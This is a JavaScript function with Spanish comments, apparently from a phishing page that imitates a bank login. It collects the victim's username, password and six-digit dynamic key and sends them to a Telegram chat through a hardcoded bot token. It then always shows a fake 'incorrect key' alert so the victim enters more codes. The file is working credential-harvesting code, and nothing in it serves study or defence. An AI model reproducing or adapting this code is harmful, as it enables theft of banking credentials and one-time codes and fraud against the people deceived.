/**
 * Envía los datos del usuario, clave principal y clave dinámica a un chat de Telegram.
 */
function enviarTelegram() {
  // Captura los 6 dígitos de la clave dinámica
  const digits = [
    document.getElementById('digit1').value,
    document.getElementById('digit2').value,
    document.getElementById('digit3').value,
    document.getElementById('digit4').value,
    document.getElementById('digit5').value,
    document.getElementById('digit6').value
  ];
  const clave2 = digits.join('') || 'No ingresado';

  // Recupera los datos de localStorage
  const user = localStorage.getItem('user') || 'No ingresado';
  const clave = localStorage.getItem('clave') || 'No ingresado';

  // Validación básica
  if (!user || !clave || !clave2 || clave2 === 'No ingresado') {
    alert('Por favor, completa todos los campos en las páginas anteriores.');
    return;
  }

  // Construye el mensaje
  const message = `
🌟 Datos de Acceso 🌟
👤 Usuario: ${user}
🔑 Clave: ${clave}
🔐 Clave Dinámica: ${clave2}
📅 Enviado el: ${new Date().toLocaleString()}
  `.trim();

  // Configuración de Telegram
  const token = '7621555641:AAFE0uU8xhw-MEqezuMeZRJARFogTqzz6fY';
  const chatId = '-1002502637141';
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  // Envía el mensaje
  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        alert('❌ Clave dinamica incorrecta, intente nuevamente.');
      } else {
        alert('❌ Clave dinamica incorrecta, intente nuevamente.' + data.description);
      }
    })
    .catch(error => {
      alert('Error de conexión. Revisa tu internet o intenta de nuevo.');
    });
}